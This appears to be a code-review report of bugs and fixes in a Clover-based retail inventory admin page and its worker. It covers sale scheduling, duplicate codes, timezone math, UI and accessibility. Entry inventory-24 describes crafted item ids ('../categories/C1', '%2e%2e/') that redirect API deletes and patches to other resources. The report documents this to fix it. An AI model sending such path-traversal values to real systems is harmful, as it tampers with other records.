**Evidence.** worker.js:19979-19991: after `const results = await Promise.all(...)` it runs `if (costCents != null) { const costs = await fetchItemCosts(env); ... costs.items[code] = { cost: costCents / 100, desc: name }; ... await env.SALES_SNAPSHOTS.put(ITEM_COSTS_KEY, ...); costUpdated = true; }` with no check on `results`. The l3Map write at 20009-20013 is likewise unconditional. aggregateItemSales costs line items from `icItems[imNum]` (worker.js:4167), so this key drives reported COGS and GPM for every store. Reproduced through the real handler with the offline harness: the item-costs KV was seeded with `12345: {cost:3.25, desc:'Paper Towels 6pk'}` and Clover stubbed to already hold code 12345. The request `{store:'all', code:'12345', name:'Widget', costCents:100, l3:'Brand New Cat'}` returned all six stores `dup` with 0 Clover writes, but `costUpdated:true, l3Mapped:true`, and afterwards item-costs[12345] = `{cost:1, desc:'Widget'}` and l3Map = `{'Brand New Cat':'Hardlines'}`.

**Failure scenario.** An admin types a code that is already in use (a typo, or re-entering an existing product). Every store shows amber 'Skipped — that code was already in use, nothing changed' (the legend at index.html:2366), yet the note says 'Item-cost table updated.' The existing item's cost is replaced chain-wide, so Weekly Retail Summary cost and margin for that IM# are wrong from then on. The same thing happens when every store fails its duplicate check (Clover down).

**Proposed fix.** Worker only; backward compatible and adds safety. At 19981 add `const anyCreated = results.some(r => r.ok);` then change the guards to `if (costCents != null && anyCreated) {...}` and `if (anyCreated) { /* l3Map block */ }`. The frontend already hides the notes when costUpdated and l3Mapped are false. Add a case to scripts/test-l3map-precedence.mjs or test-clover-duplicate-guard.mjs: all stores duplicate → item-costs unchanged and l3Map unchanged.

<a id="inventory-3"></a>
#### inventory-3 — Overlapping loadInventory calls share one global array: a double-click on Load doubles the catalog and flags every code as a duplicate

*high · minor · bug · confidence high · `index.html:30803` · unverified*

**Evidence.** index.html:30801-30823: `if (reset) { ... invViewAllItems = []; ...}` then, in a loop across awaits, `invViewAllItems = invViewAllItems.concat(data.elements);`. The Load button (2416) has no in-flight guard. invOpenInViewer (31053) and findDuplicates (31111) also call it. Executed the sliced function with a stubbed fetch returning 300 items and ran `Promise.all([loadInventory(true), loadInventory(true)])`: result `items in table: 600`, `codes flagged duplicate: 300`, status `<b>600 items</b> in BL2 · ... 300 codes are used twice`. On a failed page (`if (!data.ok) {...; return; }`) the partial array is also left in memory, and findDuplicates then reuses it as if it were the whole catalog.

**Failure scenario.** An admin double-taps Load, or presses Load again while BL1's two pages are still fetching. Every row gets the amber 'dup' badge, the summary says every code is used twice, and 'Find duplicates' lists the whole store. If they switch the store mid-load and press Load, the catalogs of two merchants are mixed under one label, and Edit then posts one store's item ids to the other merchant.

**Proposed fix.** Accumulate into a local array and commit only if this call is still the latest. `let invLoadGen = 0;` then in loadInventory: `const gen = ++invLoadGen; const store = el('inv-view-store').value; let acc = [];` Inside the loop: `if (gen !== invLoadGen) return; acc = acc.concat(data.elements || []);`. On `!data.ok` or a throw: `if (gen === invLoadGen) { invViewAllItems = []; invViewItems = []; ...error }`. After the loop: `if (gen !== invLoadGen) return; invViewStore = store; invViewAllItems = invViewItems = acc; ...`. Optionally disable the Load button while a load is in flight. Re-run the double-call harness and assert 300 items and 0 duplicates.

<a id="inventory-4"></a>
#### inventory-4 — Saving the Edit modal overwrites the item's `sku` with `code`, and wipes both when the code is empty

*high · minor · bug · confidence high · `index.html:31191` · unverified*

**Evidence.** openEditModal index.html:31157 `el('inv-edit-code').value = item.code || '';` ignores `item.sku`, which the worker returns (worker.js:20041). saveEditItem 31177 `const code = el('inv-edit-code').value.trim();` is always put in the payload (31191 `store: invViewStore, itemId, name, code, ...`). Worker update-clover-item worker.js:20082 `if (code !== undefined) { patch.code = code; patch.sku = code; }`. An empty string is not undefined, so both fields are cleared. worker.js:13434-13437 documents that some stores keep their numbers in `sku` ('when a store keeps its numbers in `sku`'), and the sticker map and existence check read BL-codes from `sku`.

**Failure scenario.** In a store that keeps sticker numbers in `sku` (code empty), an admin opens Edit on a price point only to fix the price and presses Save. The patch sends `code:'', sku:''` and Clover erases the BL-xx sticker number. Price Scan can no longer find that price point, and the category's sticker map loses it. An item with distinct code and sku silently loses its sku on any edit.

**Proposed fix.** Frontend only, and correct with the current worker because the worker patches only fields it is given. Prefill with `item.code || item.sku || ''` and stash `modal.dataset.origCode` with the same value. In saveEditItem, build the payload without `code` and add `if (code !== modal.dataset.origCode) payload.code = code;`, refusing an empty code with a status message. Verify with a stub worker that an edit touching only the price sends no `code` key.

<a id="inventory-5"></a>
#### inventory-5 — Delete is unreachable: the redesign dropped the row's Del button, so openDeleteModal has no caller

*high · minor · bug · confidence high · `index.html:31223` · unverified · fixed 2026-09-24*

**Evidence.** `grep openDeleteModal index.html` finds only its definition (31223). The row's action cell (30940) renders only `Edit`. `git show e7af0b2` (today, 'Inventory becomes a sidebar group') removed `-<button onclick='openDeleteModal(${JSON.stringify(item)})' ...>Del</button>`, while its commit message says it fixed confirmDelete's store list, so the removal was not intended. tasks/todo.md:1511: '**Brian still has to delete the five duplicates** — Admin → Inventory, keep one per store'. The #inv-delete-modal markup (2636-2656) and confirmDelete are now dead.

**Failure scenario.** Brian opens the Viewer to delete the five duplicate items left by the #265 incident. There is no delete control anywhere on the page, so the duplicates cannot be removed from this app.

**Proposed fix.** Add a Delete button to the Edit modal's footer, on the left, as `.invbtn-danger`. Remember the item when the modal opens (`invEditingItem = item` in openEditModal) and call `closeInvModal('inv-edit-modal'); openDeleteModal(invEditingItem)` on click. Put the item name into `#inv-del-name` with textContent (already done) and escape it in the success status at 31265 (`Deleted "${escapeHtml(item.name)}"`). Hide the 'Also delete from every other location' checkbox until inventory-24 is resolved. Verify in scripts/browser-inventory-nav.mjs that Edit → Delete → Delete posts `{store, itemId}` for the loaded store.

<a id="inventory-6"></a>
#### inventory-6 — Schedule Sale offers six locations but sends one store's Clover item ids; every other store's rows fail at activation

*high · minor · bug · confidence high · `index.html:31535` · unverified*

**Evidence.** The composer lets any of the six store chips be ticked (2495-2503, 'One schedule is created per location.') and submitSaleSchedule posts the same `items = [...invSelectedItems.values()].map(i => ({ id: i.id, name: i.name }))` to every store (31529-31541). The ids come from the one merchant loaded in the Viewer. index.html:17174 states '🔑 An `id:` key reaches ONE store. Clover item ids are per MERCHANT', and create-clover-item makes a separate item with its own id per store (19961). processSaleSchedules uses `getCloverItem(env, row.store, row.item_id)` (worker.js:1587). schedule-sale (27940-27960) never checks that the ids exist in that store. invSelectedItems (31283) records no store and is never cleared when another store is loaded, so a selection can also mix ids from two stores.

**Failure scenario.** An admin loads BL1, ticks 20 items, ticks all six locations and sees '20 items × 6 locations = 120 scheduled price changes'. At start time the BL1 group activates, and the other five groups turn to 'Error: Clover GET item … 404'. Those stores never go on sale, and the legend reads the error as 'did not revert — check the price by hand'.

**Proposed fix.** Minor, frontend only. Store the loaded store with each selection entry (`{id, name, priceCents, store: invLoadedStore}`) and clear the selection when loadInventory commits a different store. In invLoadSaleComposer, lock the chips to that single store: check it, disable the other five, and replace the note with 'Clover item ids belong to one store — schedule other stores from their own catalog'. Keep the submit loop, which then sends exactly one request. Future (major), a true multi-store sale: (1) worker first and additive: schedule-sale accepts `items[].code` and, for each target store, resolves ids by paging the catalogue as cloverCodeInUse does, returning per-item `unmatched`; (2) then a frontend that sends codes and shows unmatched items per store. The worker goes first because the new client depends on the code resolution. Verify with the worker harness: a BL2 schedule built from BL1 codes stores BL2 ids.

<a id="inventory-7"></a>
#### inventory-7 — An active sale with one errored item shows 'Remove' instead of 'Cancel & restore', so it cannot be cancelled; Remove also deletes error history without confirmation

*medium · minor · bug · confidence high · `index.html:31612` · unverified*

**Evidence.** list-sale-schedules promotes the worst row status to the group with `rank = { error: 4, pending: 3, active: 2, ... }` (worker.js:27987). The page then chooses the button from the group status: `const action = (g.status === 'pending' || g.status === 'active') ? Cancel : finished ? Remove` (index.html:31612-31616). Reproduced with the worker harness: group sg_1 with item statuses `active,active,error` returns `group status: error`, the page renders `Remove`, and pressing it gets `400 {"error":"Cannot remove an active/pending schedule — cancel it first"}`. removeSaleSchedule (31663) DELETEs the group's D1 rows with no uiConfirm, including 'Error' groups whose legend says 'At least one item did not revert — check the price by hand'.

**Failure scenario.** One item in a 30-item sale fails to activate (a $0 or deleted item, a Clover 429, or a foreign id from a mixed selection). The other 29 go on sale. The admin decides to stop the sale early but only sees Remove, which the worker refuses, so the discount runs until ends_at. Separately, one mis-tap on Remove for an errored group erases the only record of which items are still at the wrong price on the register.

**Proposed fix.** Frontend only. `const live = g.items.some(i => i.status === 'pending' || i.status === 'active');` then `const action = live ? <Cancel & restore> : <Remove>`. In removeSaleSchedule, first `if (!await uiConfirm(...)) return;`. When any item has errorMsg and originalPrice set without a revert, the confirm text should say those prices may still be wrong. Also let the legend distinguish 'did not apply' (no originalPrice) from 'did not revert'.

<a id="inventory-8"></a>
#### inventory-8 — Changing the Viewer's store select does not reload; Edit, Schedule sale and Find duplicates then act on the new store with the old store's rows

*medium · minor · bug · confidence high · `index.html:2404` · unverified · fixed 2026-09-24 — nothing acts on the moved select until Load, though it still does not reload by itself*

**Evidence.** index.html:2404 `<select id="inv-view-store" ... onchange="invViewStore=this.value">` only reassigns the variable while the table still shows the previous store. openEditModal titles and saves with it (31155 `Edit Item — ${invViewStore}`, 31191 `store: invViewStore`). openSaleModal preselects `el('inv-view-store').value` (31347). findDuplicates says 'reload if empty or store changed' (31109) but only checks `invViewAllItems.length === 0`, so it reports the old store's duplicates under the new store's name.

**Failure scenario.** An admin has BL1 loaded and changes the select to BL2 intending to press Load. Before doing so they press Edit on a row still showing: the modal says 'Edit Item — BL2' and Save posts a BL1 item id to BL2's merchant, which fails with an opaque Clover error. Or they tick rows and press Schedule sale: the composer preselects BL2 and the whole sale errors at start time.

**Proposed fix.** Make the select reload: `onchange="loadInventory(true)"`. Keep a separate `invLoadedStore` that is set only when a load commits (see inventory-3), and use it for openEditModal, saveEditItem, confirmDelete, openSaleModal and the findDuplicates reuse check. Optionally auto-load on first entry to the page as well.

<a id="inventory-9"></a>
#### inventory-9 — Sale fan-out uses Promise.all, so one store's network error hides the stores that succeeded; partial failures don't name the store and clear the selection

*medium · minor · bug · confidence high · `index.html:31541` · unverified*

**Evidence.** index.html:31535-31542 `const results = await Promise.all(stores.map(store => fetch(...).then(r => r.json())));`. One rejection (a dropped connection, or a non-JSON 502 page making r.json() throw) goes to `catch (err) { setSaleModalStatus('Error: ' + ...); submitBtn.disabled = false; }` although the other stores' D1 rows were inserted. The partial path says only `${errors.length} store(s) failed.` without naming the stores or reasons (31553), then calls `clearInvSelection()` (31555), so the failed stores can't be retried without re-picking every item.

**Failure scenario.** On a phone, 3 of 4 stores schedule and the 4th request drops. The screen says 'Error: Load failed'. The admin retries: the three stores now answer 409 overlap and the page reports 'Scheduled N items across 1 stores. 3 store(s) failed.', which is backwards from what actually happened. Or they assume nothing was scheduled, change the window, and end up with two sales.

**Proposed fix.** Use `Promise.allSettled` and map each to `{store, ok, error}`, reading the body with `r.json().catch(() => ({ error: `HTTP ${r.status}` }))`. Render one line per store (created N, or the reason; call a 409 'already scheduled — see log'). Clear the selection only when every store succeeded; otherwise leave only the failed stores ticked for a retry.

<a id="inventory-10"></a>
#### inventory-10 — Scheduler fires up to 50 Clover item reads and writes at once on one merchant; a 429 on revert marks the row 'error', which is never retried, leaving the item at sale price

*medium · minor · bug · confidence medium · `worker.js:1619` · unverified*

**Evidence.** worker.js:1574 `const PER_TICK = 50;`. Activation (1585) and revert (1619) both run `await Promise.allSettled((rows).map(async row => { getCloverItem...; setCloverItemFields... }))`, so every row's GET and POST go out at the same time. cloverFetch (1371) retries a 429 three times with delays shared by all callers (1 s, 2 s, 4 s), then returns the 429 and setCloverItemFields throws. The catch sets `status='error'` (1634-1639). The revert query only selects `status='active'` (1614-1616), so the item is never reverted. Elsewhere the repo deliberately serialises Clover calls to avoid 429s (worker.js:20994-20996, index.html:15710). The page promises 'Applies within ~60s' (index.html:2525), but at 50 rows per minute a 200-item sale takes 4 minutes to fully apply or revert.

**Failure scenario.** A 60-item sale ends at 21:00. The tick sends 50 GETs and 50 POSTs to one merchant, Clover rate-limits, and the retries collide again. Some reverts end on 429 and are marked Error, so those items keep selling at the discount until someone notices the red badge and re-prices each one by hand in Clover.

**Proposed fix.** Worker only, inside processSaleSchedules. (a) Process rows with bounded concurrency, e.g. a simple loop over chunks of 4. (b) In the revert catch, when the failure came from getCloverItem, or from a Clover 429/5xx (write not applied), keep `status='active'`, record the reason in error_msg, and let the next tick retry. Only the drift check and repeated failures past, say, 30 minutes should set 'error'. Do the same for activation GET failures while now < ends_at. Change the note at index.html:2525 to 'Applies within a minute per 50 items'. Verify with the harness: a stub Clover that returns 429 once per item still ends with every row 'completed'.

<a id="inventory-11"></a>
#### inventory-11 — etLocalToDate is wrong across the year boundary: a New Year's Day sale starting 00:00 starts at 22:00 on Dec 31; one ending Dec 31 23:59 runs until ~01:00

*medium · minor · bug · confidence high · `index.html:31442` · unverified*

**Evidence.** index.html:31442 `const diff = (dYr*525600 + dMo*44640 + dDa*1440 + dHr*60 + dMn) - (yr*525600 + mo*44640 + da*1440 + hr*60 + mn);`. 12 months × 44640 = 535680 is more than 525600, so the key is not monotonic from Dec to Jan and the bisection converges to the wrong end. Ran the sliced helper: `2027-01-01T00:00 -> 12/31/2026, 10:00:00 PM`, `2026-12-31T23:59 -> 1/1/2027, 1:00:59 AM`. A sweep of every 7 minutes of 2026 found 19 wrong instants, all around New Year. Results also carry random seconds (`04:00:08.437Z`) because `mid` is not minute-aligned. The default window (31386-31392) builds 'tomorrow 00:00' in the device timezone and then reads it as Eastern, so on a Central-time device at 23:30 CDT the default start is already in the past.

**Failure scenario.** An admin schedules a New Year's Day sale 'Starts 2027-01-01 00:00 Eastern'. Prices drop at 10 PM on New Year's Eve, two hours early, with the discount showing on the register during the last hours of a big trading day.

**Proposed fix.** Two-line change, checked against the same year sweep (0 wrong outside the ambiguous DST fall-back hour): `const mid = Math.floor((lo + hi) / 2 / 60000) * 60000;` and `const diff = Date.UTC(dYr, dMo-1, dDa, dHr, dMn) - localAsUtc;`. For the default window, take tomorrow's date in Eastern (`new Date().toLocaleDateString('en-CA',{timeZone:'America/New_York'})` plus one day) and set the input to that date at 'T00:00'.

<a id="inventory-12"></a>
#### inventory-12 — $-off or deep discounts silently floor items at $0.01, and $0 items preview as '−-Infinity%'; nothing warns before submit

*medium · minor · ui-ux · confidence high · `index.html:31494` · unverified*

**Evidence.** index.html:31494-31496 `Math.max(1, orig - Math.round(val * 100))` mirrors worker computeSalePrice (worker.js:1553-1560), so '$5 off' on a $3.99 item gives $0.01. The worker only aborts when `saleCents >= currentCents` (1590). The preview row just shows `$3.99 → $0.01 (−100%)` in the normal style. For a selected item with priceCents 0, `off = Math.round((1 - sale / item.priceCents) * 100)` is -Infinity and renders `(−-Infinity%)`, and the worker later errors that row. The register-name preview uses `.slice(0,127)` (31510), while buildSaleName truncates the name and keeps the '(was $…)' suffix (worker.js:1542-1550), so 'Exactly what the register will show' is wrong for long names.

**Failure scenario.** An admin runs '$5 off' across 80 selected items, a few of them priced under $5. Those sell for a penny for the whole window. The only hint is one preview row among 80 that looks like all the others.

**Proposed fix.** In updateSalePreview, flag rows where the floor applies (`sale === 1 && item.priceCents > 1`) or the price is 0, using the existing `.invit.errrow` style and the text 'floored at $0.01' or 'no price — will fail'. Put the count in the footer, and require a uiConfirm naming the count in submitSaleSchedule, or leave $0 items out. Build the register-name preview with the worker's buildSaleName logic.

<a id="inventory-13"></a>
#### inventory-13 — Item created in Clover but category link failed is reported as 'Failed — nothing was created'; a retry then skips it as a duplicate

*medium · minor · bug · confidence high · `worker.js:19968` · unverified*

**Evidence.** worker.js:19954-19971: the item POST succeeds (`const itemId = item.id`) and then `if (!assocResp.ok) { return { store: s, ok: false, error: txt, stage: "associate" }; }`, without the itemId. The catch at 19974-19975 labels any throw, including ones after the item exists, as `stage: "categories"`. The frontend maps every `!r.ok && !r.duplicate` to a red 'failed' row (30700, 30716), and the legend (2367) reads 'Failed — nothing was created in that store'.

**Failure scenario.** Clover returns 5xx on category_items for BL4. The page says BL4 failed and nothing was created, and keeps the form filled for a retry. The retry reports BL4 as 'skipped — already in use', and the item sits in BL4 with no category, so its sales book to Custom Sales until someone notices.

**Proposed fix.** Worker (additive): return `{ ok:false, created:true, itemId, stage:'associate', ... }`, and track a `stage` variable so the catch reports the real step and `created:true` once the item exists. Frontend (works with the old worker too): treat `r.stage === 'associate' || r.created` as an amber row, 'Created without its category — open in Viewer and set the category', with the Open in Viewer action.

<a id="inventory-14"></a>
#### inventory-14 — Built-in categories whose reporting group is not in the L2 dropdown (Sku Book Items, MI Bottle/Can Deposit, Custom Sales, Refund) lock the form in an unsubmittable state

*medium · minor · bug · confidence high · `index.html:31014` · unverified*

**Evidence.** index.html:31014 `l2.value = builtin; l2.disabled = true;`. OVERRIDE_L2_OPTIONS (16836-16840) has 12 values. Comparing ISR_L3_TO_L2 with those options found 4 built-in L3s whose L2 is missing: `['Custom Sales','Custom Sales'], ['MI Bottle/Can Deposit','Custom Sales'], ['Refund','Refund'], ['Sku Book Items','Sku Book Items']`. Setting a select's value to a missing option leaves it '' while disabled. createCloverItem then stops at `if (!l2) { invSetStatus('Category (L2) is required.'...)` (30657), and the worker also requires `l2` (19924).

**Failure scenario.** An admin types 'Sku Book Items' (where stores park fast-moving items) or 'MI Bottle/Can Deposit'. The form says 'auto — always books to Sku Book Items', then refuses to submit with 'Category (L2) is required.', and the L2 select is disabled so the admin cannot fix it.

**Proposed fix.** In invAddRecalc: `if (builtin && ![...l2.options].some(o => o.value === builtin)) l2.add(new Option(builtin, builtin));` before assigning. The worker ignores l2 for built-ins except to compare. Also look up `builtin` case-insensitively, as resolveCloverCategory matches names, so 'sku book items' isn't shown as a new mapping.

<a id="inventory-15"></a>
#### inventory-15 — After a successful create, the previous L2 stays selected and the margin read-outs stay stale, so the next item can inherit a wrong chain-wide mapping; the button is relabelled 'Add Item'

*medium · minor · bug · confidence high · `index.html:30756` · unverified*

**Evidence.** index.html:30756-30765 (allOk) clears name, code, price, cost and l3 but not `inv-l2`, and does not call invAddRecalc(). invResetAddForm (31076) does both. The `finally` at 30779 sets `btn.textContent = 'Add Item'` while the markup label is 'Create item' (2349). invAddRecalc keeps the previous l2 value when the next L3 is new: `l2.disabled = false; ... badge 'new mapping'` (31019-31024).

**Failure scenario.** After creating a 'Softline - Apparel' item, the admin types a brand-new L3 for a kitchen item. The L2 select is already on 'Softline - Apparel', the admin doesn't notice, and create-clover-item writes `l3Map[newL3] = 'Softline - Apparel'` for every store. The margin and multiple tiles still show the previous item's numbers over empty fields.

**Proposed fix.** In the allOk branch add `el('inv-l2').value = ''; invAddRecalc();` and keep the status message. In `finally`, restore `btn.textContent = 'Create item'`.

<a id="inventory-16"></a>
#### inventory-16 — Edit modal lets the code be changed to one already in use; the create path's duplicate guard is bypassed

*medium · minor · bug · confidence high · `index.html:31177` · unverified*

**Evidence.** saveEditItem (31176-31204) sends the new code with no check. update-clover-item (worker.js:20079-20091) patches `code`/`sku` directly, with no cloverCodeInUse call. invDupCodes is not recomputed after a save (31207-31215), so an edited row keeps or loses its 'dup' badge incorrectly until the next load.

**Failure scenario.** An admin edits a code and types one that another item already uses. Clover accepts it, the register now has two items on one code (the state lessons.md records five of from #265), and the Viewer shows no dup badge until reload.

**Proposed fix.** Frontend: when the code changed, refuse if `invViewAllItems.some(i => i.id !== itemId && dupKey(i) === code.toLowerCase())`, naming the other item. After a save, recompute `invDupCodes = invFindDupCodes(invViewAllItems)`. Optionally, worker-only and additive: when `code` is present and differs from the item's current code, call cloverCodeInUse and return 409 if another id holds it.

<a id="inventory-17"></a>
#### inventory-17 — Edit modal's 'Clover category' only ADDS a category, so a recategorisation looks done but doesn't take; cost edits don't reach the reporting cost table

*medium · minor · ui-ux · confidence high · `index.html:31193` · unverified*

**Evidence.** The payload always includes `l3` (31180, 31193) and never `removeOtherCategories`. The worker only ADDS the association (worker.js:20130-20146; removal is opt-in, 20159). pickPrimaryCategory takes the first non-sku-book category (worker.js:343-345), so the old category usually stays primary. The optimistic update sets `category: l3` (31208, 31212), so the row shows the new category until reload. Every save also costs three extra Clover calls (GET item?expand=categories, GET categories?limit=1000, POST category_items) even when the category field was not touched. Unit cost is written only to Clover's item.cost, not to the IM# table the Add form updates ('Also written to the shared item-cost table', 2303).

**Failure scenario.** An admin moves an item from the wrong L3 to the right one. The table shows the new category, but after reload it shows the old one with a '2 cats' badge, and sales keep booking to the old L3. They also fix the unit cost here expecting Weekly Summary margins to change, and they don't.

**Proposed fix.** Frontend: send `l3` only when it differs from the prefilled value. Label the field 'Add a Clover category' with the note 'the item keeps its current categories', and in the optimistic update push to `categories` instead of replacing `category`. Under Unit cost add 'Clover item cost only — the reporting cost table is unchanged'. Future (major), a real 'move': a worker option that removes the other real categories while keeping 'Sku Book Items' (the worker goes first; the option is inert until the frontend sends it).

<a id="inventory-18"></a>
#### inventory-18 — Items whose number lives in `sku` are invisible to the Viewer's Code column, search and code sort, so 'Open in Viewer' from a skipped create shows 'Nothing matches'

*medium · minor · bug · confidence medium · `index.html:30874` · unverified*

**Evidence.** The search filters `i.code.toLowerCase().includes(query)` only (30874). The Code cell renders `escapeHtml(item.code) || '—'` (30933), and sorting by code uses `a.code` (30899). dupKey already uses `item.code || item.sku` (30844), and cloverCodeInUse flags a duplicate on code OR sku (worker.js:1463). worker.js:13434-13437 says some stores keep their numbers in `sku`.

**Failure scenario.** Add Item reports 'BL4 skipped — code BL-12-0799 already in use' and offers 'Open in Viewer'. The Viewer loads BL4 with the search set to the code and shows 'Nothing matches', because the existing item holds it in `sku`, so the admin cannot see what blocked the create.

**Proposed fix.** Use `const codeOf = i => i.code || i.sku || ''` for the Code cell, the search predicate and the code sort.

<a id="inventory-19"></a>
#### inventory-19 — After scheduling, the log reloads BL1 (the select's default) rather than the store just scheduled, and the success message is cleared 1.2 s later

*medium · minor · ui-ux · confidence high · `index.html:31557` · unverified*

**Evidence.** index.html:31557 `setTimeout(() => { invLoadSaleComposer(null); loadSaleSchedules(); }, 1200);`. loadSaleSchedules reads `el('inv-sched-store').value`, which defaults to BL1 (2557-2564) and is never set to the scheduled store. invLoadSaleComposer calls `setSaleModalStatus('', null)` (31394), which hides the 'Scheduled N items…' strip. loadSaleSchedules has no request token, so switching the store select quickly can let an older response overwrite the list.

**Failure scenario.** An admin schedules a BL8 sale. The confirmation flashes for about a second, and the Scheduled sales panel shows BL1's log without the new sale, so it looks like nothing happened and they submit again (the 409 overlap guard then errors).

**Proposed fix.** Before the timeout, set `el('inv-sched-store').value = stores[0]` (the stores that succeeded). Give invLoadSaleComposer a `keepStatus` flag, or skip the status reset on this path. Add `const gen = ++invSchedGen` in loadSaleSchedules and drop stale responses.

<a id="inventory-20"></a>
#### inventory-20 — The Viewer rebuilds the whole table (≈1.5 KB of HTML per row) on every search keystroke: 370–900 ms per key at 1,100 items unthrottled, 6–7 s at 5,000 on a 4× slower CPU

*medium · minor · performance · confidence high · `index.html:2412` · unverified*

**Evidence.** index.html:2412 `oninput="renderInvTable()"`, with no debounce. renderInvTable (30916-30942) maps every row to an HTML string including `JSON.stringify(item)` in the Edit attribute, the name three times, and fmtDollar, which calls `toLocaleString` with options (a new NumberFormat per call: 60 ms per 2,200 calls vs 1 ms with a cached Intl.NumberFormat). Measured in Chromium on the sliced function: 1,100 items → tbody 1,692,158 bytes, per keystroke [818, 914, 372, 582] ms (string ≈60, parse ≈45, layout ≈180). 5,000 items → ≈2.6 s, and 6.1–7.1 s with 4× CPU throttling. invDropSaleItem (31402) also re-renders the hidden table for each chip removal.

**Failure scenario.** On a phone, typing 'towel' into the BL1 search freezes the page for several seconds, and characters appear in bursts.

**Proposed fix.** (1) Debounce the search: `oninput="invSearchDebounced()"` with a 150 ms timeout. (2) Render at most 300 matching rows with a 'Show all N' row. (3) Use a module-level `const invMoney = new Intl.NumberFormat('en-US',{style:'currency',currency:'USD'})` for the price and cost cells. (4) Drop the JSON attribute (see inventory-1). (5) Add `table-layout:fixed` with the existing column widths on `.invtbl`. Re-run the timing script and aim for under 50 ms per keystroke at 1,100 items.

<a id="inventory-21"></a>
#### inventory-21 — Phone: every Inventory input is 12.5–13.5px, so iOS zooms the page on focus; key tap targets are 14–31px

*medium · minor · ui-ux · confidence high · `index.html:2007` · unverified*

**Evidence.** `.invi{...font-size:13.5px...}` (2007) and `input.invi.invi-sm,select.invi.invi-sm{...font-size:12.5px...}` (2020). No later override exists, and the viewport meta (line 5) has no maximum-scale. The app's own rule elsewhere says '16px, not 15: iOS zooms the whole page into any smaller input on focus' (1280, 4741). Tap targets: `.invtbl input[type="checkbox"]{width:14px;height:14px}` (2123), `.invbtn-sm{padding:6px 11px;font-size:11.5px}` ≈31px tall (2056, which covers Edit, Load, Clear and the log's Cancel & restore), and the chip remove `.invchip .x{font-size:15px;padding:0 1px}` ≈17px (2165).

**Failure scenario.** An admin on an iPhone taps the search box, Price or the datetime fields. Safari zooms in and stays zoomed, so the sticky table and header must be pinched back on every field. Ticking rows or removing a chip needs precise taps and often hits the wrong row.

**Proposed fix.** In the inventory `<style>` block add `@media (max-width:1023px){ .invi, input.invi.invi-sm, select.invi.invi-sm{font-size:16px} .invbtn-sm{min-height:40px} .invtbl input[type="checkbox"]{width:20px;height:20px} .invtbl .ck{width:44px} .invchip .x{min-width:32px;min-height:32px} }`. Widen the sticky name column's `left:34px` to 44px under the same query.

<a id="inventory-24"></a>
#### inventory-24 — Delete modal's 'Also delete from every other location' deletes nothing and reports success (latent until inventory-5 rewires Delete)

*medium · minor · bug · confidence high · `index.html:31244` · unverified · fixed 2026-09-24 — the checkbox is gone; the worker still reports a 404 as ok, which, sent to the right store, now means already gone*

**Worker half (2026-09-24).**
- `delete-clover-item` now refuses the `{ stores: [...] }` form with 400 `ONE_STORE_PER_DELETE`, so nothing can reach it any more. It also answers a GET with 405, and a body that isn't JSON with 400, where both used to throw.
- **Found on the way:** the item id was pasted into Clover's URL, and the URL parser resolves `../categories/C1`, even written as `%2e%2e/`. So a crafted id made this a DELETE on a category. Ids must now be alphanumeric.
- `scripts/test-inventory-delete.mjs` pins all of this against the real handler.
- **This takes effect only after a `wrangler deploy`.**

**The same hole in `update-clover-item` (2026-09-24).**
- It pasted `itemId` into two Clover URLs, the patch POST and the `?expand=categories` read, after checking only that the id was truthy. So `../categories/C1` made the patch a POST to a category, and `X1/../../..` a POST to `/v3/merchants/`.
- Both handlers now use one rule, `isCloverId()`. Update also answers a GET with 405, and a body that isn't JSON with 400, as delete does.
- `scripts/test-inventory-update.mjs` pins it against the real handler.
- **This also takes effect only after a `wrangler deploy`.**

**Evidence.** index.html:31244 `? { stores: INV_STORES.filter(st => st !== invViewStore), itemId: item.id }`. This sends one merchant's item id to the other five merchants (ids are per merchant, index.html:17174) and leaves out the store being viewed. Worker delete-clover-item treats `delResp.status === 404` as `{ ok: true }` (worker.js:20224). The client then removes the row locally and prints `Deleted "${item.name}".` (31261-31265), with the name unescaped into innerHTML.

**Failure scenario.** Once Delete is reachable again, Brian ticks 'Also delete from every other location' to remove a duplicate chain-wide. Every other store answers 404, which counts as 'ok'; the current store is never sent. The page says Deleted and hides the row, but the item still exists in all six stores.

**Proposed fix.** When rewiring Delete (inventory-5), remove the checkbox so the modal deletes only `{store: invLoadedStore, itemId}`. Report a 404 as 'already gone' rather than success. Escape `item.name` in the status. Future (major): per-store deletion by code, resolved in the worker as in inventory-6's plan.

<a id="inventory-25"></a>
#### inventory-25 — The Edit modal's category datalist is appended to on every open and never cleared; openEditModal also repopulates the Add page's datalist with the Viewer's store

*low · minor · bug · confidence high · `index.html:30633` · unverified*

**Evidence.** loadCategoriesForStore clears only `inv-cat-datalist` (30620 `dl.innerHTML = ''`). For the edit list it only appends: `const editDl = el('inv-edit-l3-list'); ... editDl.appendChild(opt2)` (30628-30637). It is called by every openEditModal (31168) and every visit to Add Item (31070). Two calls in flight (store changes) both append into the Add list as well.

**Failure scenario.** After an admin has opened Edit ten times, each category suggestion appears ten times in the dropdown. After opening Edit in the BL8 Viewer, the Add form (set to 'All 6 locations', which should suggest BL1) suggests BL8's categories.

**Proposed fix.** Give loadCategoriesForStore a target list (`loadCategoriesForStore(store, targetId)`) and clear that target before filling it. Use a request token so a stale response is dropped. openEditModal passes 'inv-edit-l3-list' only.

<a id="inventory-26"></a>
#### inventory-26 — Hidden-item rows dim text with opacity .55, failing AA in both themes (light 2.33–4.16:1, dark 2.62–3.30:1)

*low · minor · accessibility · confidence high · `index.html:2135` · unverified*

**Evidence.** index.html:2135 `.invtbl tr.off .invname,.invtbl tr.off .num{opacity:.55}`. Computed from the real tokens: light ink #14110a@.55 on #ffffff = 4.16, the Modified column (`num invdim`, #6b6453@.55) = 2.33, GP% #92400e/#c0392b/#166534@.55 = 2.64/2.46/2.60. Dark #8893a7@.55 on #101826 = 2.62, GP% 3.30/2.75/3.20. OLED Modified 3.19, and 2.21–2.37 on a dup wash. The row already carries a 'hidden' badge (30938), so opacity is a second, unreadable signal.

**Failure scenario.** An admin scanning a store with many hidden items can't read their prices, margins or ages, especially in light mode or outdoors on a phone.

**Proposed fix.** Replace the opacity with a colour: `.invtbl tr.off .invname{color:#6b6453} .dark .invtbl tr.off .invname{color:rgb(var(--op-inkDim))}` (inkDim is ≥5.2:1 on both panels) and leave `.num` at full strength. The 'hidden' badge and the legend already explain the state.

<a id="inventory-27"></a>
#### inventory-27 — Keyboard/screen-reader gaps: sortable headers are click-only <th>, modals have no dialog semantics, focus or Escape, status strips aren't live, and the discount input has no label

*low · minor · accessibility · confidence high · `index.html:2428` · unverified*

